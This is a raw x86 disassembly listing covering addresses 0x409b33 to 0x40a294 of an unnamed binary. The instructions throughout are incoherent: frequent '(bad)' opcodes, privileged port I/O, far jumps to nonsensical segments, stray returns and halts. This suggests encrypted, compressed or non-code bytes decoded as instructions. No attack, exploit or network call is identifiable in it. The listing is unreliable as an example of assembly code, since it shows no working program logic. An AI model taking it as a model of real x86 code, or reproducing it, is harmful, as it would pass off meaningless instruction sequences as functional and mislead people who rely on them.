  409b33:	ds leave 
  409b35:	fwait
  409b36:	ss je  0x409af2
  409b39:	dec    edi
  409b3a:	in     eax,0xe1
  409b3c:	mov    ds:0x17e66195,eax
  409b41:	sbb    dh,bh
  409b43:	push   ebp
  409b44:	mov    al,0xb
  409b46:	rol    eax,1
  409b48:	out    dx,al
  409b49:	test   DWORD PTR [edx],edx
  409b4b:	cwde   
  409b4c:	mov    ch,0x9b
  409b4e:	adc    esi,edx
  409b50:	sbb    eax,0x647babf8
  409b55:	jo     0x409ba3
  409b57:	iret   
  409b58:	ret    0x4b38
  409b5b:	je     0x409b05
  409b5d:	aaa    
  409b5e:	out    0xb0,al
  409b60:	mov    esi,0xcb61ff33
  409b65:	mov    ebp,0xc274bb23
  409b6a:	das    
  409b6b:	scas   eax,DWORD PTR es:[edi]
  409b6c:	es clc 
  409b6e:	dec    ecx
  409b6f:	and    al,0x4
  409b71:	scas   eax,DWORD PTR es:[edi]
  409b72:	mov    eax,0x384ea0b8
  409b77:	lods   eax,DWORD PTR ds:[esi]
  409b78:	jl     0x409ba3
  409b7a:	loopne 0x409b81
  409b7c:	or     bh,cl
  409b7e:	test   eax,0xa610d700
  409b83:	je     0x409bdc
  409b85:	and    cl,BYTE PTR [eax]
  409b87:	retf   0x69d7
  409b8a:	test   BYTE PTR [eax-0x5],ch
  409b8d:	nop
  409b8e:	lahf   
  409b8f:	test   al,0x32
  409b91:	mov    cl,0x71
  409b93:	mov    esp,0x51a0c61a
  409b98:	add    al,0x18
  409b9a:	cmc    
  409b9b:	dec    esp
  409b9c:	mov    ?,edi
  409b9e:	xor    DWORD PTR [ebp+edx*1+0x5c],edx
  409ba2:	ds dec esi
  409ba4:	adc    esi,DWORD PTR [ecx+0x27]
  409ba7:	(bad)  
  409ba8:	fisubr WORD PTR [ecx-0x25]
  409bab:	repz or bl,dl
  409bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409baf:	fnstsw WORD PTR [ebp-0x78]
  409bb2:	mov    cl,0xf2
  409bb4:	out    dx,al
  409bb5:	(bad)  
  409bb6:	xchg   esi,eax
  409bb7:	sbb    bh,BYTE PTR [bx+0x305d]
  409bbc:	push   0x5db855e5
  409bc1:	jge    0x409c25
  409bc3:	push   eax
  409bc4:	xor    bh,BYTE PTR [edi+ebx*1+0x3a832d77]
  409bcb:	int3   
  409bcc:	shr    DWORD PTR [esi],0xa5
  409bcf:	call   0xa7bdff50
  409bd4:	hlt    
  409bd5:	cmp    DWORD PTR [ebx-0x5cadca0e],esp
  409bdb:	xchg   BYTE PTR [ebp+0x55],dl
  409bde:	sbb    al,dl
  409be0:	in     al,0x76
  409be2:	dec    ecx
  409be3:	repnz push 0xffffff97
  409be6:	cs pop esp
  409be8:	lds    eax,FWORD PTR [ebp+0x7d028534]
  409bee:	xchg   ecx,eax
  409bef:	nop
  409bf0:	fwait
  409bf1:	sub    ah,BYTE PTR [ecx+0x5e]
  409bf4:	sub    DWORD PTR [eax],ebx
  409bf6:	(bad)  
  409bf7:	push   edx
  409bf8:	fimul  WORD PTR [edx+ebp*1+0x1a628ee9]
  409bff:	ds jl  0x409c18
  409c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c03:	aaa    
  409c04:	dec    DWORD PTR [ebx-0x1ef4236d]
  409c0a:	jno    0x409c14
  409c0c:	mov    ah,0x2e
  409c0e:	push   0x9c5b7f4d
  409c13:	in     eax,0x40
  409c15:	mov    bl,0xfa
  409c17:	sub    cl,bl
  409c19:	cdq    
  409c1a:	lahf   
  409c1b:	jnp    0x409beb
  409c1d:	hlt    
  409c1e:	inc    di
  409c20:	xchg   DWORD PTR [ecx-0x103bafa2],esp
  409c26:	jbe    0x409c14
  409c28:	retf   0xb3f0
  409c2b:	ret    
  409c2c:	xchg   ebp,eax
  409c2d:	jne    0x409c35
  409c2f:	in     eax,0x30
  409c31:	push   ebp
  409c32:	mov    al,ds:0xcc3f0841
  409c37:	ret    0x7b93
  409c3a:	xlat   BYTE PTR ds:[ebx]
  409c3b:	push   es
  409c3c:	sub    edi,ebx
  409c3e:	les    edx,FWORD PTR [ebx*2+0x28ae5b56]
  409c45:	mov    dh,0x8d
  409c47:	mov    bh,BYTE PTR [ebp-0x2a]
  409c4a:	lds    edi,FWORD PTR [eax+edi*1]
  409c4d:	push   ebx
  409c4e:	repz cli 
  409c50:	mov    eax,ds:0xab861587
  409c55:	inc    ecx
  409c56:	pop    ds
  409c57:	inc    ebx
  409c58:	push   0xffffffd9
  409c5a:	adc    dl,cl
  409c5c:	mov    bl,al
  409c5e:	add    cl,bl
  409c60:	lahf   
  409c61:	pop    eax
  409c62:	ffree  st(6)
  409c64:	xchg   ebx,eax
  409c65:	mov    dl,0xfa
  409c67:	cwde   
  409c68:	leave  
  409c69:	lahf   
  409c6a:	ss mov esp,0x256e81d4
  409c70:	pop    ds
  409c71:	push   0x44842e95
  409c76:	xor    dh,dl
  409c78:	ins    DWORD PTR es:[edi],dx
  409c79:	(bad)  
  409c7a:	jp     0x409c1b
  409c7c:	iret   
  409c7d:	enter  0x242e,0x35
  409c81:	push   edi
  409c82:	push   eax
  409c83:	js     0x409c42
  409c85:	lock sti 
  409c87:	loopne 0x409c2f
  409c89:	push   ss
  409c8a:	ds out 0x88,al
  409c8d:	idiv   DWORD PTR cs:[esi-0x3e8e9ea8]
  409c94:	das    
  409c95:	stc    
  409c96:	test   DWORD PTR [esi+0x39],esi
  409c99:	dec    esp
  409c9a:	cmp    eax,0x3ae35d91
  409c9f:	pushf  
  409ca0:	jo     0x409c89
  409ca2:	fcom   QWORD PTR [ebp-0x24]
  409ca5:	or     dl,BYTE PTR [ebx]
  409ca7:	call   0x5a94:0xe5a128be
  409cae:	lock sub ecx,edi
  409cb1:	ret    0xb3c1
  409cb4:	leave  
  409cb5:	push   ebp
  409cb6:	xchg   ecx,eax
  409cb7:	mov    al,0x8e
  409cb9:	in     al,dx
  409cba:	and    bl,BYTE PTR [ebx]
  409cbc:	inc    esp
  409cbd:	or     DWORD PTR cs:0x21e3667a,eax
  409cc4:	test   al,0x86
  409cc6:	repnz nop
  409cc8:	js     0x409d26
  409cca:	push   ebx
  409ccb:	repnz and eax,0x68cfed1f
  409cd1:	test   DWORD PTR [ebp+0x66],ebp
  409cd4:	leave  
  409cd5:	xchg   esp,eax
  409cd6:	daa    
  409cd7:	fisttp QWORD PTR [ecx]
  409cd9:	mov    al,ds:0xfa8acc11
  409cde:	sub    cl,dh
  409ce0:	adc    al,BYTE PTR [ebx]
  409ce2:	sbb    eax,0x8c35b40f
  409ce7:	mov    ?,ecx
  409ce9:	in     eax,0x88
  409ceb:	dec    esi
  409cec:	and    BYTE PTR [edx+0xe],al
  409cef:	scas   eax,DWORD PTR es:[edi]
  409cf0:	add    esp,DWORD PTR ds:0x922f4834
  409cf6:	pop    DWORD PTR [eax-0x6d]
  409cf9:	cmp    eax,0xed46d79d
  409cfe:	xchg   edx,eax
  409cff:	mov    ah,0x5
  409d01:	cmp    esi,DWORD PTR [edi-0x72]
  409d04:	jmp    0xee8e0cdf
  409d09:	and    eax,0xc700855a
  409d0e:	inc    ebp
  409d0f:	adc    eax,0xfd59bd65
  409d14:	cs dec ebx
  409d16:	pop    ss
  409d17:	retf   0x6881
  409d1a:	or     al,0x8f
  409d1c:	sub    eax,0x8d1db0c2
  409d21:	retf   
  409d22:	sbb    dl,BYTE PTR [ecx+0x8183e05]
  409d28:	or     DWORD PTR [eax+0x44d94d86],ebp
  409d2e:	cwde   
  409d2f:	popf   
  409d30:	in     eax,dx
  409d31:	test   bl,dl
  409d33:	les    edi,FWORD PTR [ebp-0x1df049a4]
  409d39:	mov    BYTE PTR [esi],cl
  409d3b:	adc    eax,0x3eac695e
  409d40:	dec    ecx
  409d41:	ret    0x4801
  409d44:	(bad)  
  409d45:	xor    ecx,DWORD PTR [edx-0x30]
  409d48:	call   0x8c6a2b18
  409d4d:	adc    bh,0x4f
  409d50:	xchg   ebx,eax
  409d51:	and    al,0xa1
  409d53:	frstor [esi+0x35]
  409d56:	push   0x672ef986
  409d5b:	shr    BYTE PTR [edi-0x5ae1519e],cl
  409d61:	pop    esp
  409d62:	fld    TBYTE PTR [ebx-0x3e]
  409d65:	adc    BYTE PTR [edx+0x707a35e2],0x2b
  409d6c:	mov    bl,0x2d
  409d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d6f:	inc    edx
  409d70:	dec    edx
  409d71:	iret   
  409d72:	(bad)  
  409d73:	push   ecx
  409d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d75:	leave  
  409d76:	aam    0x42
  409d78:	dec    eax
  409d79:	add    ebx,DWORD PTR [esi-0x7a82ee70]
  409d7f:	pushf  
  409d80:	mov    WORD PTR [esi-0x68],gs
  409d83:	xchg   ebp,eax
  409d84:	mov    ebp,0xb1d50953
  409d89:	sub    cl,al
  409d8b:	sub    al,0x1e
  409d8d:	outs   dx,DWORD PTR ds:[esi]
  409d8e:	jmp    0x6892:0xc753081
  409d95:	lock icebp 
  409d97:	adc    BYTE PTR [ebx],dl
  409d99:	jae    0x409d3a
  409d9b:	mov    esi,0xbb571f0f
  409da0:	ins    BYTE PTR es:[edi],dx
  409da1:	jno    0x409db2
  409da3:	mov    bl,0x45
  409da5:	shl    BYTE PTR [ebx-0x4a78d0f9],1
  409dab:	(bad)  
  409dac:	ins    BYTE PTR es:[edi],dx
  409dad:	lea    eax,[esi-0x5]
  409db0:	mov    ch,BYTE PTR [eax]
  409db2:	outs   dx,BYTE PTR ds:[esi]
  409db3:	ins    DWORD PTR es:[edi],dx
  409db4:	fucomp st(2)
  409db6:	mov    WORD PTR [esp+esi*2-0x14],ds
  409dba:	stos   DWORD PTR es:[edi],eax
  409dbb:	jno    0x409dca
  409dbd:	iret   
  409dbe:	out    dx,al
  409dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dc0:	jp     0x409d8a
  409dc2:	push   DWORD PTR ds:0x6cc5eafc
  409dc8:	sub    esi,DWORD PTR [eax-0x48]
  409dcb:	test   DWORD PTR [ecx+0x1d],esi
  409dce:	push   0x50a43d0e
  409dd3:	ror    dl,0x26
  409dd6:	(bad)  
  409dd8:	dec    edx
  409dd9:	ret    
  409dda:	js     0x409dd7
  409ddc:	xor    ecx,ebx
  409dde:	pop    ebx
  409ddf:	test   BYTE PTR [eax-0x4c],bl
  409de2:	add    ecx,DWORD PTR [ecx-0x23]
  409de5:	out    0xb6,al
  409de7:	dec    edx
  409de8:	fst    DWORD PTR [edi+0x3ba20228]
  409dee:	lock adc BYTE PTR ds:0x3a84b550,al
  409df5:	xchg   ecx,eax
  409df6:	ins    BYTE PTR es:[edi],dx
  409df7:	dec    esp
  409df8:	test   esi,ebp
  409dfa:	lods   eax,DWORD PTR ds:[esi]
  409dfb:	addr16 mov bl,0x3e
  409dfe:	sub    al,0x70
  409e00:	push   ecx
  409e01:	jb     0x409e02
  409e03:	or     ah,bh
  409e05:	loop   0x409e1a
  409e07:	loopne 0x409dad
  409e09:	pop    ss
  409e0a:	dec    edi
  409e0b:	int3   
  409e0c:	dec    esp
  409e0d:	or     eax,0xdac48b07
  409e12:	int    0xe3
  409e14:	and    cl,al
  409e16:	aam    0x12
  409e18:	addr16 pop ss
  409e1a:	fist   DWORD PTR [edi-0x32c0ace7]
  409e20:	pop    es
  409e21:	and    eax,0xdfbdf9aa
  409e26:	mov    ebx,0x74076777
  409e2b:	jmp    0x409e54
  409e2d:	(bad)  
  409e2e:	jns    0x409dfb
  409e30:	jo     0x409dfa
  409e32:	dec    ecx
  409e34:	test   al,0x2c
  409e36:	mov    al,0x43
  409e38:	rcr    DWORD PTR [eax+edx*8],1
  409e3b:	jb     0x409e9d
  409e3d:	fnstsw WORD PTR [di]
  409e40:	(bad)  
  409e41:	pushf  
  409e42:	aas    
  409e43:	out    dx,eax
  409e44:	add    al,0x64
  409e46:	stos   BYTE PTR es:[edi],al
  409e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e48:	push   esi
  409e49:	dec    ecx
  409e4a:	inc    edx
  409e4b:	push   ecx
  409e4c:	ins    DWORD PTR es:[edi],dx
  409e4d:	shl    BYTE PTR [edi],0x48
  409e50:	inc    ebx
  409e51:	repnz ror ah,cl
  409e54:	jmp    0x6c69:0xfb896b00
  409e5b:	sub    edi,eax
  409e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e5e:	shr    BYTE PTR [ecx],cl
  409e60:	sub    BYTE PTR [edx],ah
  409e62:	sti    
  409e63:	xchg   esp,eax
  409e64:	jno    0x409eac
  409e66:	jecxz  0x409ec9
  409e68:	out    dx,al
  409e69:	push   ss
  409e6a:	dec    edx
  409e6b:	inc    ebx
  409e6c:	mov    ch,0xf1
  409e6e:	(bad)  
  409e6f:	adc    al,0xb1
  409e71:	retf   0xb8d
  409e74:	xor    edi,0x49
  409e77:	pop    esi
  409e78:	push   es
  409e79:	dec    ecx
  409e7a:	pop    edx
  409e7b:	retf   0xa782
  409e7e:	call   0x92496765
  409e83:	leave  
  409e84:	ds out dx,eax
  409e86:	xchg   ebx,eax
  409e87:	adc    edi,DWORD PTR [ebx-0x2f8d5141]
  409e8d:	lods   al,BYTE PTR ds:[esi]
  409e8e:	ja     0x409e63
  409e90:	lea    esp,[edx+0x7e3f56b1]
  409e96:	mov    esi,0x510f4699
  409e9b:	shl    DWORD PTR [esi+0x52b7568],0x3f
  409ea2:	test   eax,edx
  409ea4:	sti    
  409ea5:	arpl   WORD PTR [ecx+0x32],ax
  409ea8:	mov    esi,0xc203c287
  409ead:	inc    ebx
  409eae:	mov    ebx,0xd877a659
  409eb3:	and    esp,DWORD PTR [ecx+0x4e]
  409eb6:	sar    dl,0x5a
  409eb9:	inc    ebp
  409eba:	adc    edi,DWORD PTR es:[edx-0x2b]
  409ebe:	cmp    esi,DWORD PTR [edx-0x28d69feb]
  409ec4:	shl    DWORD PTR [eax],cl
  409ec6:	outs   dx,DWORD PTR ds:[esi]
  409ec7:	push   ebp
  409ec8:	or     al,0x38
  409eca:	jb     0x409eb4
  409ecc:	shufps xmm6,XMMWORD PTR [esi-0x707e868c],0xf4
  409ed4:	or     eax,DWORD PTR [ebp-0x1]
  409ed7:	inc    BYTE PTR [edx+0x53]
  409eda:	jp     0x409ea2
  409edc:	(bad)  
  409edd:	cli    
  409ede:	sar    DWORD PTR [ebx+0x72658ec4],cl
  409ee4:	jl     0x409ef9
  409ee6:	ds inc ebp
  409ee8:	jecxz  0x409e6b
  409eea:	clc    
  409eeb:	pop    esp
  409eec:	sbb    eax,0xbb85ada3
  409ef1:	mov    DWORD PTR [edx],edi
  409ef3:	leave  
  409ef4:	push   esp
  409ef5:	jnp    0x409e92
  409ef7:	mov    ds:0x882168d5,al
  409efc:	mov    dh,0xdf
  409efe:	cli    
  409eff:	xchg   ecx,eax
  409f00:	dec    edx
  409f01:	xor    bl,bl
  409f03:	sbb    al,0x8e
  409f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f06:	cmp    BYTE PTR [edi],al
  409f08:	push   esp
  409f09:	mov    ebp,0xa147d5dd
  409f0e:	jl     0x409eb5
  409f10:	dec    eax
  409f11:	daa    
  409f12:	int    0xc5
  409f14:	push   edx
  409f15:	imul   ah
  409f17:	mov    esp,DWORD PTR [esi-0x172966fd]
  409f1d:	add    esi,ecx
  409f1f:	cmova  ebx,DWORD PTR [edx]
  409f22:	add    cl,dh
  409f24:	dec    esp
  409f25:	or     DWORD PTR [edx],edx
  409f27:	icebp  
  409f28:	repnz mov edx,0x6b553e1a
  409f2e:	shl    ah,cl
  409f30:	cmc    
  409f31:	and    BYTE PTR [ecx],bh
  409f33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f34:	mov    BYTE PTR [ecx-0x5aea5e0e],al
  409f3a:	and    ebp,DWORD PTR [ecx-0x67]
  409f3d:	ja     0x409f08
  409f3f:	xchg   ebx,eax
  409f40:	test   BYTE PTR [ecx],bl
  409f42:	aam    0x95
  409f44:	push   cs
  409f45:	out    0x90,al
  409f47:	(bad)  [esi]
  409f49:	das    
  409f4a:	or     al,0x16
  409f4c:	xchg   esi,eax
  409f4d:	dec    BYTE PTR [esi+ebx*1]
  409f50:	arpl   WORD PTR [edx+0x775720a0],ax
  409f56:	icebp  
  409f57:	mov    dh,0xc4
  409f59:	sbb    DWORD PTR [ebp+0x4c23b79],ebx
  409f5f:	in     al,dx
  409f60:	outs   dx,BYTE PTR ds:[esi]
  409f61:	outs   dx,BYTE PTR ds:[esi]
  409f62:	add    BYTE PTR [edi-0x16],ch
  409f65:	mov    ds:0x39c9869,eax
  409f6a:	fwait
  409f6b:	popf   
  409f6c:	lock mov eax,0xdf442592
  409f72:	repz xor BYTE PTR [eax+0x22],al
  409f76:	ret    0x98fe
  409f79:	js     0x409f1d
  409f7b:	and    ch,ch
  409f7d:	shl    BYTE PTR [edx],1
  409f7f:	aas    
  409f80:	and    al,0x93
  409f82:	and    BYTE PTR [edx],0x64
  409f85:	cmc    
  409f86:	sub    eax,DWORD PTR [ebx+eax*1]
  409f89:	sub    al,0x60
  409f8b:	clc    
  409f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f8d:	or     DWORD PTR [esi+eiz*4],eax
  409f90:	dec    ecx
  409f91:	in     eax,0x7c
  409f93:	test   BYTE PTR [edx-0x4b],0xcb
  409f97:	pop    es
  409f98:	in     eax,0x18
  409f9a:	pop    edi
  409f9b:	ins    BYTE PTR es:[edi],dx
  409f9c:	adc    edi,DWORD PTR [ebp+0x4323cdd4]
  409fa2:	sub    BYTE PTR [ecx],ch
  409fa4:	ficomp WORD PTR [edx-0x6f]
  409fa7:	mov    ch,0xc1
  409fa9:	fisub  WORD PTR [edi-0x595830b4]
  409faf:	(bad)  
  409fb0:	repnz cmp dl,BYTE PTR [edx-0xa]
  409fb4:	out    0xc7,eax
  409fb6:	fwait
  409fb7:	les    edi,FWORD PTR [edx]
  409fb9:	and    DWORD PTR [edx-0x61610ee9],ebp
  409fbf:	nop
  409fc0:	std    
  409fc1:	push   ss
  409fc2:	js     0x409f9c
  409fc4:	xor    al,BYTE PTR [edx-0x3247dd97]
  409fca:	(bad)  
  409fcb:	mov    ah,0x6
  409fcd:	mov    dl,0x87
  409fcf:	loopne 0x409ff7
  409fd1:	test   BYTE PTR [ebp+0x326432fa],bl
  409fd7:	inc    ecx
  409fd8:	shl    BYTE PTR [edx],0x1b
  409fdb:	xor    bh,bh
  409fdd:	popa   
  409fde:	xchg   BYTE PTR [edx-0x2f8fc3de],bl
  409fe4:	adc    dl,BYTE PTR [edi+0x4e]
  409fe7:	mov    eax,ds:0xd6a3ec7b
  409fec:	add    ebp,DWORD PTR [esi]
  409fee:	inc    ecx
  409fef:	dec    ebp
  409ff0:	add    BYTE PTR [edx-0x2f130ad7],dl
  409ff6:	in     eax,0x2f
  409ff8:	sub    esi,DWORD PTR ds:0xaf1cd5d9
  409ffe:	inc    eax
  409fff:	jl     0x409fef
  40a001:	out    dx,al
  40a002:	popa   
  40a003:	shl    ch,1
  40a005:	test   eax,0x5848c990
  40a00a:	je     0x40a082
  40a00c:	fnstenv [ebx-0x1847a2e]
  40a012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a013:	cdq    
  40a014:	pop    es
  40a015:	dec    eax
  40a016:	dec    esp
  40a017:	sbb    al,0xa4
  40a019:	dec    ebp
  40a01a:	jg     0x409fc6
  40a01c:	jae    0x40a071
  40a01e:	frstor [esi+esi*4+0x44]
  40a022:	sbb    cl,BYTE PTR [esp+ebx*2+0x3074b3b9]
  40a029:	outs   dx,DWORD PTR ds:[esi]
  40a02a:	les    ebx,FWORD PTR [ecx+0x41]
  40a02d:	jb     0x40a04d
  40a02f:	jno    0x40a094
  40a031:	mov    dh,0xc8
  40a033:	cli    
  40a034:	inc    esp
  40a035:	nop
  40a036:	rol    DWORD PTR [ebp+0x79],1
  40a039:	jg     0x40a099
  40a03b:	ret    
  40a03c:	nop
  40a03d:	stc    
  40a03e:	mov    cl,0x4e
  40a040:	xor    edi,ebp
  40a042:	xor    eax,0x6c25fc88
  40a047:	iret   
  40a048:	adc    BYTE PTR [esi+0x655429ed],dl
  40a04e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a04f:	out    dx,eax
  40a050:	outs   dx,DWORD PTR ds:[esi]
  40a051:	pop    edx
  40a052:	data16 out dx,al
  40a054:	test   al,0x49
  40a056:	gs mov bl,0x5c
  40a059:	fistp  WORD PTR gs:[ebp-0x6c384d6d]
  40a060:	push   ebx
  40a061:	pop    DWORD PTR [eax+ebx*8+0x56d27885]
  40a068:	clc    
  40a069:	mov    esp,0x9140eddb
  40a06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a06f:	adc    BYTE PTR [ecx],bh
  40a071:	in     al,0xf3
  40a073:	sbb    al,0x39
  40a075:	in     al,0x66
  40a077:	mov    ebx,0xbdf52c6a
  40a07c:	mov    ch,BYTE PTR [eax+0x6e8e616a]
  40a082:	mov    cl,0x27
  40a084:	pop    esi
  40a085:	sbb    ax,WORD PTR [edx-0x1a1a8434]
  40a08c:	xchg   ebx,eax
  40a08d:	lds    edx,FWORD PTR [ebx-0x77]
  40a090:	popa   
  40a091:	mov    bl,0x34
  40a093:	repnz outs dx,DWORD PTR ds:[esi]
  40a095:	(bad)  
  40a096:	mov    esi,0x1bf899b6
  40a09b:	loop   0x40a096
  40a09d:	stc    
  40a09e:	dec    edx
  40a09f:	loopne 0x40a0dd
  40a0a1:	xor    al,0xca
  40a0a3:	adc    eax,0x217f8a7e
  40a0a8:	xlat   BYTE PTR ds:[ebx]
  40a0a9:	jecxz  0x40a081
  40a0ab:	pop    es
  40a0ac:	push   eax
  40a0ad:	sti    
  40a0ae:	ror    BYTE PTR [edx+esi*4],1
  40a0b1:	loopne 0x40a092
  40a0b3:	pushf  
  40a0b4:	add    edx,0x7db30dc2
  40a0ba:	inc    esp
  40a0bb:	pop    ds
  40a0bc:	mov    BYTE PTR [edi+ebx*1+0x46],bh
  40a0c0:	jg     0x40a07d
  40a0c2:	cmc    
  40a0c3:	stos   BYTE PTR es:[edi],al
  40a0c4:	and    al,0x2a
  40a0c6:	fcom   QWORD PTR [ebx+0x14666ea7]
  40a0cc:	arpl   WORD PTR [edi-0x37],cx
  40a0cf:	stc    
  40a0d0:	adc    DWORD PTR [edi+0x54d42e6b],edx
  40a0d6:	lock push es
  40a0d8:	fwait
  40a0d9:	mov    bh,0xa2
  40a0db:	jle    0x40a0e4
  40a0dd:	pushf  
  40a0de:	jnp    0x40a115
  40a0e0:	arpl   WORD PTR [edi-0x26],cx
  40a0e3:	or     DWORD PTR [ebx+eax*2+0x6bf81ad],eax
  40a0ea:	sbb    BYTE PTR [edx],0xad
  40a0ed:	cld    
  40a0ee:	pushf  
  40a0ef:	test   al,0xb6
  40a0f1:	pop    ebp
  40a0f2:	adc    al,0xd9
  40a0f4:	or     eax,0x46969d30
  40a0f9:	test   esi,0xd22f04c6
  40a0ff:	(bad)  
  40a100:	ds cld 
  40a102:	xchg   DWORD PTR [edx+eiz*8-0x61],eax
  40a106:	imul   edi,DWORD PTR [ebx-0x701460ff],0x1f
  40a10d:	repnz mov DWORD PTR [edi],ecx
  40a110:	add    al,BYTE PTR [esi+0x10]
  40a113:	cmp    BYTE PTR [eax],0xad
  40a116:	call   DWORD PTR [edx+edx*8-0x7b]
  40a11a:	jns    0x40a142
  40a11c:	dec    eax
  40a11d:	nop
  40a11e:	jno    0x40a18c
  40a120:	sahf   
  40a121:	cmc    
  40a122:	inc    esi
  40a123:	pop    ss
  40a124:	or     ecx,DWORD PTR [esi]
  40a126:	call   0x37c4:0x35b0a12f
  40a12d:	inc    eax
  40a12e:	xchg   edi,eax
  40a12f:	jecxz  0x40a118
  40a131:	sbb    ah,BYTE PTR [edi+0x7c]
  40a134:	mov    ebx,0x39523880
  40a139:	xor    dh,dh
  40a13b:	pop    edx
  40a13c:	dec    esi
  40a13d:	dec    ebx
  40a13e:	cmc    
  40a13f:	pushf  
  40a140:	aaa    
  40a141:	jl     0x40a0ea
  40a143:	push   cs
  40a144:	cwde   
  40a145:	push   esi
  40a146:	inc    ecx
  40a147:	retf   
  40a148:	push   ebp
  40a149:	jle    0x40a16d
  40a14b:	retf   0xdaa8
  40a14e:	or     ebp,DWORD PTR [edx-0x13d4219e]
  40a154:	jg     0x40a10b
  40a156:	jmp    0xf248:0x8452bb07
  40a15d:	jbe    0x40a188
  40a15f:	add    eax,0x7778bd3a
  40a164:	fimul  WORD PTR [eax]
  40a166:	cmp    ecx,DWORD PTR [ecx+0x13a4c507]
  40a16c:	lods   al,BYTE PTR ds:[esi]
  40a16d:	test   DWORD PTR [ebp+0xc],esp
  40a170:	and    eax,0x9f130cab
  40a175:	push   edi
  40a176:	cwde   
  40a177:	sahf   
  40a178:	jg     0x40a100
  40a17a:	inc    esp
  40a17b:	jns    0x40a1cc
  40a17d:	push   edi
  40a17e:	rcr    DWORD PTR [ebp+0x4c],cl
  40a181:	mov    eax,0x8f460d80
  40a186:	ret    0xb2a
  40a189:	dec    esi
  40a18a:	add    edi,DWORD PTR cs:[edi]
  40a18d:	sbb    dl,bh
  40a18f:	mov    ecx,0xd398e97e
  40a194:	cmc    
  40a195:	fwait
  40a196:	mov    al,ds:0x9a223e8c
  40a19b:	ins    BYTE PTR es:[edi],dx
  40a19c:	pop    ds
  40a19d:	push   edi
  40a19e:	mov    esp,0x38ec3ef0
  40a1a3:	aad    0xd3
  40a1a5:	cmp    dl,0x33
  40a1a8:	mov    ch,0x63
  40a1aa:	push   eax
  40a1ab:	push   edx
  40a1ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ad:	(bad)  
  40a1ae:	push   esp
  40a1af:	sub    eax,esi
  40a1b1:	ja     0x40a13f
  40a1b3:	or     BYTE PTR [eax-0x61],dl
  40a1b6:	enter  0x9fad,0xbd
  40a1ba:	mov    edx,0x8b90dd05
  40a1bf:	or     esp,0x3
  40a1c2:	add    dl,BYTE PTR [eax+0x530efd2f]
  40a1c8:	xchg   edi,eax
  40a1c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ca:	in     eax,dx
  40a1cb:	cmc    
  40a1cc:	aaa    
  40a1cd:	cld    
  40a1ce:	out    0x31,al
  40a1d0:	cwde   
  40a1d1:	xchg   esi,eax
  40a1d2:	xor    dh,dl
  40a1d4:	xchg   ebp,eax
  40a1d5:	inc    ebx
  40a1d6:	jmp    0xdd2f:0xde0241b9
  40a1dd:	in     al,0xe7
  40a1df:	xchg   edi,eax
  40a1e0:	loop   0x40a16f
  40a1e2:	je     0x40a198
  40a1e4:	jp     0x40a1ba
  40a1e6:	mov    esp,0xfbc11633
  40a1eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1ec:	pop    ebx
  40a1ed:	add    DWORD PTR fs:[ebx-0x8],esi
  40a1f1:	imul   esp,DWORD PTR ds:0x9f41b90b,0xffffff91
  40a1f8:	hlt    
  40a1f9:	and    al,0xc9
  40a1fb:	cmc    
  40a1fc:	add    al,BYTE PTR [edx-0x2d]
  40a1ff:	shr    bh,cl
  40a201:	xchg   edi,eax
  40a202:	and    DWORD PTR ds:0x1465b88c,edx
  40a208:	inc    esp
  40a209:	or     edi,esi
  40a20b:	jno    0x40a289
  40a20d:	imul   ebp,DWORD PTR [ebx+0x71c0198d],0x5f5745a7
  40a217:	cmp    dh,cl
  40a219:	hlt    
  40a21a:	add    edi,DWORD PTR [esi+0x78cb2721]
  40a220:	add    ch,bh
  40a222:	(bad)  
  40a223:	push   edx
  40a224:	dec    edi
  40a225:	stc    
  40a226:	js     0x40a1c6
  40a228:	inc    DWORD PTR [ecx+0x6655ff94]
  40a22e:	dec    ecx
  40a22f:	mov    dl,0x8f
  40a231:	stc    
  40a232:	xchg   ebp,eax
  40a233:	test   DWORD PTR [edx-0x5d4f94a5],eax
  40a239:	ret    0xba96
  40a23c:	pop    ss
  40a23d:	cmc    
  40a23e:	cmp    al,0x2f
  40a240:	adc    ah,BYTE PTR [ebx+0x3a989fab]
  40a246:	out    dx,eax
  40a247:	sub    BYTE PTR [ecx+0xf],ch
  40a24a:	sbb    edi,DWORD PTR [ecx+0x49]
  40a24d:	scas   al,BYTE PTR es:[edi]
  40a24e:	sti    
  40a24f:	repnz ins DWORD PTR es:[edi],dx
  40a251:	hlt    
  40a252:	retf   
  40a253:	iret   
  40a254:	loope  0x40a2aa
  40a256:	ret    
  40a257:	dec    edi
  40a258:	(bad)  
  40a259:	pop    ecx
  40a25a:	stos   DWORD PTR es:[edi],eax
  40a25b:	fdivr  QWORD PTR [ecx-0x3d]
  40a25e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a25f:	push   cs
  40a260:	push   edi
  40a261:	inc    esi
  40a262:	jbe    0x40a2a0
  40a264:	(bad)  
  40a266:	cld    
  40a267:	in     eax,dx
  40a268:	loopne 0x40a23c
  40a26a:	(bad)  
  40a26b:	neg    DWORD PTR [eax+0x24e7e76d]
  40a271:	cs or  eax,0x4da5ff70
  40a277:	fisubr DWORD PTR [eax]
  40a279:	inc    esi
  40a27a:	ret    0x9b17
  40a27d:	sub    eax,0xb7516ff1
  40a282:	nop    DWORD PTR [edi-0x63883983]
  40a289:	lea    ebx,[edi]
  40a28b:	mov    bh,0x5d
  40a28d:	pop    es
  40a28e:	fbstp  TBYTE PTR [edi+0x4f]
  40a291:	cmc    
  40a292:	shl    BYTE PTR [edi],cl
  40a294:	mov    cl,0x4a
